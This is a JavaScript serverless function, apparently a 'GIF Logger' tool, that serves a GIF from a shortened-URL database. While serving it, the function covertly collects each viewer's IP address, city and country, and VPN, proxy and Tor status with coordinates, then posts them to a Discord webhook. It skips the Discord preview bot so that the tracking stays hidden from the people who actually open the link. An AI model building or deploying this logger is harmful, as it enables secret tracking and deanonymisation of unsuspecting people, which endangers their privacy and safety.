export default async function handler(req, res) {
  const { id } = req.query;
  const userAgent = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  const spamFiles = ['favicon.ico', 'favicon.png', 'robots.txt', 'sitemap.xml'];
  if (spamFiles.includes(id) || userAgent.includes('vercel-favicon')) {
    return res.status(204).end(); 
  }
  
  const baseUrl = process.env.FIREBASE_DB_URL;
  const cleanBase = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
  const fbUrl = `${cleanBase}/shortenedurls/${id}.json`;
  
  let targetUrl;
  try {
    const fbRequest = await fetch(fbUrl);
    targetUrl = await fbRequest.json();
  } catch (e) {
    return res.status(500).send("Database Error");
  }
  
  if (!targetUrl) {
    return res.status(404).send("GIF ID not found.");
  }
  
  const isDiscordBot = userAgent.includes('Discordbot');
  if (isDiscordBot) {
    return sendGif(targetUrl, res);
  }
  
  let vpnData = null;
  if (process.env.VPNAPI_KEY) {
    try {
      const cleanIp = ip.split(',')[0].trim(); // Handle x-forwarded-for with multiple IPs
      const vpnResponse = await fetch(`https://vpnapi.io/api/${cleanIp}?key=${process.env.VPNAPI_KEY}`);
      vpnData = await vpnResponse.json();
    } catch (e) {
    }
  }
  
  if (process.env.DISCORD_WEBHOOK_URL) {
    const country = req.headers['x-vercel-ip-country'] || 'Unknown';
    const city = req.headers['x-vercel-ip-city'] || 'Unknown';
    const region = req.headers['x-vercel-ip-country-region'] || 'Unknown';
    
    const mainEmbed = {
      title: "GIF Logger Hit",
      color: 0x2ECC71,
      timestamp: new Date().toISOString(),
      footer: { text: "GIF Logger v2 | github.com/dreamyfx" },
      fields: [
        { name: "🔑 ID", value: `\`${id}\``, inline: true },
        { name: "🌍 Location", value: `${city}, ${country}`, inline: true },
        { name: "📡 IP", value: `\`${ip}\``, inline: true },
        { name: "📂 Original", value: `[Source](${targetUrl})`, inline: false }
      ],
      thumbnail: { url: targetUrl }
    };
    
    const embeds = [mainEmbed];
    
    if (vpnData && vpnData.security) {
      const sec = vpnData.security;
      const loc = vpnData.location || {};
      const net = vpnData.network || {};
      
      const vpnEmbed = {
        title: "Query from vpnapi",
        color: (sec.vpn || sec.proxy || sec.tor || sec.relay) ? 0xE74C3C : 0x2ECC71,
        fields: [
          { 
            name: "VPN", 
            value: sec.vpn ? "🔴 Yes" : "✅ No", 
            inline: true 
          },
          { 
            name: "Proxy", 
            value: sec.proxy ? "🔴 Yes" : "✅ No", 
            inline: true 
          },
          { 
            name: "Tor Node", 
            value: sec.tor ? "🔴 Yes" : "✅ No", 
            inline: true 
          },
          { 
            name: "Relay", 
            value: sec.relay ? "🔴 Yes" : "✅ No", 
            inline: true 
          }
        ]
      };
      
      if (loc.city || loc.country) {
        vpnEmbed.fields.push({
          name: "📍 ISP Location",
          value: `${loc.city || 'Unknown'}, ${loc.region || ''} ${loc.country || 'Unknown'}\nLat/Long: ${loc.latitude || 'N/A'}, ${loc.longitude || 'N/A'}`,
          inline: false
        });
      }
      
      if (net.autonomous_system_organization) {
        vpnEmbed.fields.push({
          name: "🌐 Network",
          value: `**ASN:** ${net.autonomous_system_number || 'N/A'}\n**Org:** ${net.autonomous_system_organization || 'N/A'}\n**Range:** \`${net.network || 'N/A'}\``,
          inline: false
        });
      }
      
      embeds.push(vpnEmbed);
    }
    
    fetch(process.env.DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds })
    }).catch(() => {}); 
  }
  
  return sendGif(targetUrl, res);
}

async function sendGif(url, res) {
  try {
    const imageResponse = await fetch(url);
    const buffer = await imageResponse.arrayBuffer();
    
    res.setHeader("Content-Type", "image/gif");
    res.setHeader("Cache-Control", "public, max-age=3600");
    res.send(Buffer.from(buffer));
  } catch (error) {
    res.status(500).send("Forbidden");
  }
}
